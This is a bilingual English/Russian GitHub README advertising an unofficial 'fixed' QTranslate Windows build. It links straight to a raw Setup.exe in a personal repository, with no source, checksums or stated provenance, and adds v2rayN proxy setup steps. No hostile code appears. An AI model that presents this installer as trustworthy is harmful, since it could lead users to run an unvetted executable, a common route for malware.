<div align="center">

# QTranslate Fixed

**A ready-to-use Windows build of QTranslate with repaired Google Translate and DeepL integrations.**

**Готовая сборка QTranslate для Windows с исправленными Google Translate и DeepL.**

[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D6?logo=windows&logoColor=white)](https://github.com/ayorogamble/-FIXED-QTranslate)
[![Version](https://img.shields.io/badge/version-v1.0.0-brightgreen)](https://github.com/ayorogamble/-FIXED-QTranslate)
[![Google Translate](https://img.shields.io/badge/Google%20Translate-fixed-4285F4?logo=googletranslate&logoColor=white)](https://github.com/ayorogamble/-FIXED-QTranslate)
[![DeepL](https://img.shields.io/badge/DeepL-fixed-0F2B46)](https://github.com/ayorogamble/-FIXED-QTranslate)

### [⬇ Download QTranslate Fixed v1.0.0](https://github.com/ayorogamble/-FIXED-QTranslate/raw/refs/heads/main/QTranslate-Fixed-v1.0.0-Setup.exe)

[English](#english) · [Русский](#русский)

</div>

---

## English

### What is this?

QTranslate Fixed is a community-maintained Windows build of QTranslate intended to restore translation services that no longer work correctly in older QTranslate installations.

Current fixes:

- **Google Translate**
- **DeepL**
- Ready-to-use Windows installer
- System proxy support for VPN-based setups

The goal is simple: **download, install, configure your network if necessary, and use QTranslate normally.**

### Installation

1. Download [QTranslate-Fixed-v1.0.0-Setup.exe](https://github.com/ayorogamble/-FIXED-QTranslate/raw/refs/heads/main/QTranslate-Fixed-v1.0.0-Setup.exe).
2. Run the installer.
3. Launch `QTranslate.exe`.
4. If translation services do not respond, follow the VPN / proxy instructions below.

### VPN / Proxy setup

Depending on your country, ISP, VPN configuration, or network restrictions, Google Translate or DeepL may not be reachable directly from QTranslate.

A recommended Windows client is [v2rayN](https://github.com/2dust/v2rayN).

For v2rayN:

1. Connect to a working server.
2. At the bottom of v2rayN, change **Clear system proxy** to **Set system proxy**.
3. Open **QTranslate Settings**.
4. Open **Proxy server**.
5. Select **Use system proxy settings**.
6. Fully restart QTranslate.

If your VPN already uses **TUN mode** or full-tunnel routing for all Windows traffic, enabling System Proxy may not be necessary.

### Browser proxy

If you also want to manage proxy routing separately inside a Chromium-based browser, you can use:

[Proxy SwitchyOmega 3 / ZeroOmega](https://chromewebstore.google.com/detail/proxy-switchyomega-3-zero/pfnededegaaopdmhkdmcofjmoldfiped)

This is optional and is not required for QTranslate itself.

### Troubleshooting

If a service stops working:

1. Confirm the same service opens in your browser through the current VPN.
2. Make sure **Use system proxy settings** is enabled in QTranslate.
3. Restart QTranslate completely, including its tray process.
4. Try a different VPN exit node or IP.
5. Check this repository for an updated build.

### Important notice

DeepL and Google integrations in this build rely on unofficial client/web endpoints. These endpoints can change, rate-limit requests, or stop accepting anonymous traffic without notice.

This project is not affiliated with QTranslate, Google, DeepL, v2rayN, or ZeroOmega.

---

## Русский

### Что это?

QTranslate Fixed представляет собой поддерживаемую сообществом сборку QTranslate для Windows, цель которой восстановить сервисы перевода, переставшие нормально работать в старых версиях QTranslate.

Сейчас исправлены:

- **Google Translate**
- **DeepL**
- Готовый установщик для Windows
- Работа через системный прокси для VPN

Цель простая: **скачать, установить, при необходимости настроить сеть и пользоваться QTranslate как обычно.**

### Установка

1. Скачайте [QTranslate-Fixed-v1.0.0-Setup.exe](https://github.com/ayorogamble/-FIXED-QTranslate/raw/refs/heads/main/QTranslate-Fixed-v1.0.0-Setup.exe).
2. Запустите установщик.
3. Откройте `QTranslate.exe`.
4. Если сервисы перевода не отвечают, выполните настройку VPN / Proxy ниже.

### Настройка VPN / Proxy

В зависимости от страны, провайдера, VPN или сетевых ограничений Google Translate и DeepL могут быть недоступны для QTranslate напрямую.

В качестве клиента для Windows можно использовать [v2rayN](https://github.com/2dust/v2rayN).

Для v2rayN:

1. Подключитесь к рабочему серверу.
2. В нижней части v2rayN вместо **Очистить системный прокси** выберите **Установить системный прокси**.
3. Откройте **Настройки QTranslate**.
4. Перейдите в **Прокси-сервер**.
5. Выберите **Использовать системные настройки прокси**.
6. Полностью перезапустите QTranslate.

Если ваш VPN уже работает через **TUN mode** или направляет весь трафик Windows через VPN, отдельно включать системный прокси может быть необязательно.

### Прокси для браузера

Если вам также нужно отдельно управлять прокси внутри браузера на Chromium, можно использовать:

[Proxy SwitchyOmega 3 / ZeroOmega](https://chromewebstore.google.com/detail/proxy-switchyomega-3-zero/pfnededegaaopdmhkdmcofjmoldfiped)

Для работы самого QTranslate это расширение не обязательно.

### Если что-то перестало работать

1. Проверьте, открывается ли нужный сервис в браузере через текущий VPN.
2. Убедитесь, что в QTranslate включено **Использовать системные настройки прокси**.
3. Полностью закройте QTranslate, включая процесс в трее, и запустите снова.
4. Попробуйте другой VPN сервер или IP.
5. Проверьте этот репозиторий на наличие новой версии.

### Важно

Интеграции DeepL и Google в этой сборке используют неофициальные клиентские / веб endpoints. Они могут измениться, начать ограничивать запросы или перестать принимать анонимный трафик.

Проект не связан официально с QTranslate, Google, DeepL, v2rayN или ZeroOmega.

---

<div align="center">

If this build helped you, consider starring the repository so other QTranslate users can find it more easily.

Если сборка помогла, поставьте репозиторию звезду. Так другим пользователям QTranslate будет проще его найти.

</div>
